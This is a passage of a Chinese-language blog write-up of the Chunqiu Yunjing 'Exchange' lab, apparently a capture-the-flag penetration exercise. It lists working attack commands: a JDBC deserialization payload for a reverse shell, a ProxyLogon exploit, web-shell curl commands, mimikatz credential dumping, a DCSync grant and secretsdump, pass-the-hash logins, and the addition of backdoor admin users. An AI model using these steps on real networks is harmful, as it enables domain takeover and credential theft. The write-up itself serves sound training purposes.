class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;pass&quot;</span>,<br>			<span class="hljs-string">&quot;statementInterceptors&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<br>			<span class="hljs-string">&quot;autoDeserialize&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>,<br>			<span class="hljs-string">&quot;NUM_HOSTS&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>作用是向远程 vps 伪造的恶意 MySQL 服务发送 SQL 请求，服务端返回恶意 SQL 结果触发反序列化。将 payload 进行 url 编码后发送：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102192446.png"></p>
+<p>成功执行反弹 shell：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102192558.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102192628.png"></p>
+<p>获取入口机的 flag:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102192849.png"></p>
+<h1 id="0x04-搭建代理"><a href="#0x04-搭建代理" class="headerlink" title="0x04 搭建代理"></a>0x04 搭建代理</h1><p>工具：<a target="_blank" rel="noopener" href="https://github.com/LxxxSec/FastProxy">FastProxy</a>，建议仅在靶场使用。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102195523.png"></p>
+<p>在远程 vps 中启动 app.py 脚本：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102200259.png"></p>
+<p>复制上方启动脚本的 curl 命令，在入口机中执行：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102200453.png"></p>
+<p>socks 代理信息在 vps 端。在 kali 上编辑<code>/etc/proxychains4.conf</code>：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102205146.png"></p>
+<p>测试一下，结果显示代理搭建成功：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102210315.png"></p>
+<h1 id="0x05-内网扫描"><a href="#0x05-内网扫描" class="headerlink" title="0x05 内网扫描"></a>0x05 内网扫描</h1><p>查看入口机 ip 地址：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250102210500.png"></p>
+<p>进入 &#x2F;tmp 目录，使用 fscan 扫描整个网段：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/fscan -h 172.22.3.12/</span><span class="hljs-number">16</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight accesslog"><table><tr><td class="code"><pre><code class="hljs accesslog">   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">1</span><br>start infoscan<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">12</span>     is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>      is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>      is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>     is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">255</span>.<span class="hljs-number">253</span>  is alive<br><span class="hljs-string">[*]</span> LiveTop <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span>    段存活数量为: <span class="hljs-number">5</span><br><span class="hljs-string">[*]</span> LiveTop <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>    段存活数量为: <span class="hljs-number">4</span><br><span class="hljs-string">[*]</span> LiveTop <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>  段存活数量为: <span class="hljs-number">1</span><br><span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">5</span><br><span class="hljs-number">172.22.3.9:445</span> open<br><span class="hljs-number">172.22.3.26:445</span> open<br><span class="hljs-number">172.22.3.9:808</span> open<br><span class="hljs-number">172.22.3.2:445</span> open<br><span class="hljs-number">172.22.3.9:443</span> open<br><span class="hljs-number">172.22.3.9:139</span> open<br><span class="hljs-number">172.22.3.2:139</span> open<br><span class="hljs-number">172.22.3.26:135</span> open<br><span class="hljs-number">172.22.3.26:139</span> open<br><span class="hljs-number">172.22.3.9:135</span> open<br><span class="hljs-number">172.22.3.2:135</span> open<br><span class="hljs-number">172.22.3.9:81</span> open<br><span class="hljs-number">172.22.3.9:80</span> open<br><span class="hljs-number">172.22.3.2:88</span> open<br><span class="hljs-number">172.22.3.9:8172</span> open<br><span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">15</span><br>start vulscan<br><span class="hljs-string">[+]</span> NetInfo:<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-PC<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span><br><span class="hljs-string">[*]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span>          XIAORANG\XIAORANG-PC       <br><span class="hljs-string">[+]</span> NetInfo:<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-WIN16<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br><span class="hljs-string">[*]</span> WebTitle:http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>         code:<span class="hljs-number">403</span> len:<span class="hljs-number">0</span>      title:None<br><span class="hljs-string">[+]</span> NetInfo:<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-EXC01<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span><br><span class="hljs-string">[*]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>  (Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span>)<br><span class="hljs-string">[*]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>     <span class="hljs-string">[+]</span>DC XIAORANG\XIAORANG-WIN16    Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><br><span class="hljs-string">[*]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>           XIAORANG\XIAORANG-EXC01    Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><br><span class="hljs-string">[*]</span> WebTitle:http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">81</span>      code:<span class="hljs-number">403</span> len:<span class="hljs-number">1157</span>   title:<span class="hljs-number">403</span> - 禁止访问: 访问被拒绝。<br><span class="hljs-string">[*]</span> WebTitle:https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>:<span class="hljs-number">8172</span>   code:<span class="hljs-number">404</span> len:<span class="hljs-number">0</span>      title:None<br><span class="hljs-string">[*]</span> WebTitle:https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>        code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/owa/<br><span class="hljs-string">[*]</span> WebTitle:https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/owa/auth/logon.aspx?url=https%3a%2f%2f172.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>%2fowa%2f&amp;reason=<span class="hljs-number">0</span> code:<span class="hljs-number">200</span> len:<span class="hljs-number">28237</span>  title:Outlook<br>已完成 <span class="hljs-number">15</span>/<span class="hljs-number">15</span><br><span class="hljs-string">[*]</span> 扫描结束,耗时: <span class="hljs-number">21</span>.323436507s<br></code></pre></td></tr></table></figure>
+
+<p>端口开放情况：</p>
+<figure class="highlight accesslog"><table><tr><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.3.9</span>：<span class="hljs-number">445</span>, <span class="hljs-number">808</span>, <span class="hljs-number">443</span>, <span class="hljs-number">139</span>, <span class="hljs-number">135</span>, <span class="hljs-number">81</span>, <span class="hljs-number">80</span>, <span class="hljs-number">8172</span><br><span class="hljs-number">172.22.3.2</span>：<span class="hljs-number">445</span>, <span class="hljs-number">139</span>, <span class="hljs-number">135</span>, <span class="hljs-number">88</span> <br><span class="hljs-number">172.22.3.26</span>：<span class="hljs-number">445</span>, <span class="hljs-number">135</span>, <span class="hljs-number">139</span><br>// <span class="hljs-number">88</span> 端口用于域控服务器的身份验证功能<br></code></pre></td></tr></table></figure>
+
+<p>内网信息搜集结果：</p>
+<figure class="highlight accesslog"><table><tr><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.3.2</span>	XIAORANG-WIN16	域控<br><span class="hljs-number">172.22.3.9</span>	XIAORANG-EXC01	Exchange邮件服务器<br><span class="hljs-number">172.22.3.26</span>	XIAORANG-PC	    个人电脑<br><span class="hljs-number">172.22.3.12</span>                 入口机<br></code></pre></td></tr></table></figure>
+
+
+<h1 id="0x06-横向移动-Exchange邮件服务器"><a href="#0x06-横向移动-Exchange邮件服务器" class="headerlink" title="0x06 横向移动-Exchange邮件服务器"></a>0x06 横向移动-Exchange邮件服务器</h1><p><strong>ProxyLogon</strong>(CVE-2021-26855) 是一个存在于 Microsoft Exchange Server 的漏洞，可以使攻击者绕过身份验证并模拟用户。</p>
+<p>EXP: <a target="_blank" rel="noopener" href="https://github.com/herwonowr/exprolog">https://github.com/herwonowr/exprolog</a></p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> python3 exprolog.py -t <span class="hljs-number">172.22.3.9</span> -e administrator<span class="hljs-variable">@xiaorang</span>.lab<br></code></pre></td></tr></table></figure>
+
+<p>成功拿到 SYSTEM 权限：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250103144323.png"></p>
+<p>用提供的命令测试一下：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">proxychains curl <span class="hljs-params">--request</span> POST <span class="hljs-params">--url</span> https:<span class="hljs-string">//172.22.3.9/owa/auth/xxala.aspx</span> <span class="hljs-params">--header</span> &#x27;Content-Type: application/x-www-form-urlencoded&#x27; <span class="hljs-params">--data</span> &#x27;request=Response.Write<span class="hljs-params">(new ActiveXObject(&quot;WScript.Shell&quot;)</span><span class="hljs-string">.exec</span><span class="hljs-params">(&quot;whoami /all&quot;)</span><span class="hljs-string">.stdout.readall</span><span class="hljs-params">()</span>)&#x27; -k<br></code></pre></td></tr></table></figure>
+
+<p>成功：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250103144447.png"></p>
+<p>添加个用户：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">net <span class="hljs-keyword">user</span> foobar pass<span class="hljs-variable">@123</span> <span class="hljs-operator">/</span><span class="hljs-keyword">add</span><br>net localgroup administrators foobar <span class="hljs-operator">/</span><span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250103151142.png"></p>
+<p>接下来使用 kali 自带的 <strong>remmina</strong> 远程登录该用户，由于靶机是 Windows 系统，选择 RDP 协议。</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains remmina</span><br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250103151751.png"></p>
+<p>获取邮件服务器的 flag：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250103152735.png"></p>
+<h1 id="0x07-横向移动-域控"><a href="#0x07-横向移动-域控" class="headerlink" title="0x07 横向移动-域控"></a>0x07 横向移动-域控</h1><p>配置 remmina 的 share folder 共享本地文件：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250103154250.png"></p>
+<p>[mimikatz](<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">gentilkiwi&#x2F;mimikatz: A little tool to play with Windows security</a>)：内网渗透神器，可以从 lsass.exe 进程中提取明文密码、哈希值、PIN 码和 Kerberos 票据，它还可以执行传递哈希值、传递票据、建立票据、伪造域管理凭证令牌等诸多功能。</p>
+<p>以管理员权限打开 cmd，进入 <strong>mimikatz</strong> 相应的目录下，执行以下命令：</p>
+<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\mimikatz.exe</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt; <span class="hljs-number">1.txt</span><br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250104162409.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250103155045.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250103172142.png"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">BloodHound</a>：是一款以可视化图形分析域环境中的关系的工具。<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/288370.html">渗透测试之内网攻防篇：使用 BloodHound 分析大型域内环境 - FreeBuf网络安全行业门户</a></p>
+<p>使用 <strong>BloodHound</strong> 进行信息收集。因为只有 SYSTEM 用户有域权限，所以不能用新加的用户，需要用 ProxyLogon 的 shell 来执行命令：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">proxychains curl <span class="hljs-params">--request</span> POST <span class="hljs-params">--url</span> https:<span class="hljs-string">//172.22.3.9/owa/auth/bzjtp.aspx</span> <span class="hljs-params">--header</span> &#x27;Content-Type: application/x-www-form-urlencoded&#x27; <span class="hljs-params">--data</span> &#x27;request=Response.Write<span class="hljs-params">(new ActiveXObject(&quot;WScript.Shell&quot;)</span><span class="hljs-string">.exec</span><span class="hljs-params">(&quot;C:\Users\foobar\Desktop\Collectors/SharpHound.exe -c all --OutputDirectory C:/Users/foobar/Desktop/&quot;)</span><span class="hljs-string">.stdout.readall</span><span class="hljs-params">()</span>)&#x27; -k<br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250103161949.png"></p>
+<p>把收集到的数据放到本地分析：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/288370.html">渗透测试之内网攻防篇：使用 BloodHound 分析大型域内环境 - FreeBuf网络安全行业门户</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250104172541.png"></p>
+<p>发现 exchange 上的域用户有 <strong>writeDacl</strong> 权限。DACL (Discretionary Access Control List) 是访问控制列表的一部分，定义了哪些用户或组可以访问某个资源，以及能执行哪些操作。用户可以通过 WriteDACL 权限将自己添加为资源的完全控制者。</p>
+<p><a href="%5Bhttps://github.com/SecureAuthCorp/impacket%5D(https://github.com/SecureAuthCorp/impacket" title="https://github.com/SecureAuthCorp/impacket">Impacket</a>):是用于处理网络协议的 Python 类的集合。<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11877?time__1311=Cq0xuD0DnAit=GNeeeu0DfE1K=GQWWrW4D">Impacket脚本利用指南（上） - 先知社区</a></p>
+<p>前面已经拿到了<code>XIAORANG-EXC01$</code>这个机器用户的 NTLM hash，所以可以先用 Impacket 中的 <strong>psexec.py</strong> 进行 <strong>PTH</strong> (Pass-the-Hash，利用 NTLM hash 冒充用户访问网络资源或系统，无需知道密码本身），获取 system 权限的可交互shell：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> python3 wmiexec.py -hashes :<span class="hljs-number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb xiaorang/administrator@<span class="hljs-number">172.22.3.2</span><br></code></pre></td></tr></table></figure>
+
+<p>上传<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">powerview.ps1</a>，为 Zhangtong 用户添加 <strong>DCSync</strong> 权限。DCSync 权限允许用户模拟<strong>域控</strong>请求帐户凭据，这是一种高权限操作，常见于密码提取攻击。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">powershell -<span class="hljs-built_in">command</span> <span class="hljs-string">&quot;cd C:/Users/foobar/Desktop/; Import-Module .\powerview.ps1; Add-DomainObjectAcl -TargetIdentity &#x27;DC=xiaorang,DC=lab&#x27; -PrincipalIde Zhangtong -Rights DCSync -Verbose&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250104181135.png"><br>  接着利用 Zhangtong 用户导出域内哈希：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> python3 secretsdump.py xiaorang.lab/Zhangtong@<span class="hljs-number">172.22.3.2</span> -hashes :<span class="hljs-number">22</span>c7f81993e96ac83ac2f3f1903de8b4 -just-dc<br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250104181507.png"></p>
+<p>域管哈希为：7acbc09a6c0efd81bfa7d5a1d4238beb，用 <strong>wmiexec</strong> 登录域控：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> python3 wmiexec.py -hashes :<span class="hljs-number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb xiaorang/administrator@<span class="hljs-number">172.22.3.2</span><br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250104181925.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250103175520.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250103175613.png"></p>
+<p>获取域控的 flag:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250103175756.png"></p>
+<h1 id="0x08-横向移动-个人电脑"><a href="#0x08-横向移动-个人电脑" class="headerlink" title="0x08 横向移动-个人电脑"></a>0x08 横向移动-个人电脑</h1><p>还有个 172.22.3.26 没用到。刚刚导出的域内哈希显示还有个用户是 Lumia：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250104182241.png"></p>
+<p>在域控上新增一个管理员用户：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">net<span class="hljs-built_in"> user bridge </span>pass@123 /<span class="hljs-built_in">add</span><br>net localgroup administrators<span class="hljs-built_in"> bridge </span>/add<br></code></pre></td></tr></table></figure>
+
+<p>登录域控，win+r 输入 dsa.msc，在 Active Directory 修改 Lumia 用户的密码：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250104182558.png"></p>
+<p>登录 172.22.3.26 的 rdp 后发现桌面有一个 secret.zip，不过需要解压密码。</p>
+<p>内网中还存在Exchange服务，访问 <a target="_blank" rel="noopener" href="https://172.22.3.9/owa/">https://172.22.3.9/owa/</a> ，使用 Lumia 用户的密码登录，查看邮件：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250104183122.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250104183139.png"></p>
+<p>放到 ARCHPR 中爆破，手机号为 18763918468，解压拿到个人电脑的 flag:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020250103182217.png"></p>
+<h1 id="0x09-Conclusion"><a href="#0x09-Conclusion" class="headerlink" title="0x09 Conclusion"></a>0x09 Conclusion</h1><p>第一次接触内网渗透，打靶过程非常吃力，基本遇到的全是新知识，继续加油吧。</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/Avatar.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/Avatar.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">xxshh</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2025/01/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2025/01/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/')">春秋云镜-Exchange</span></a></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank"></a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>红队技能<span class="tagsPageCount">4</span></a><a class="post-meta__box__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>内网渗透<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>春秋云镜<span 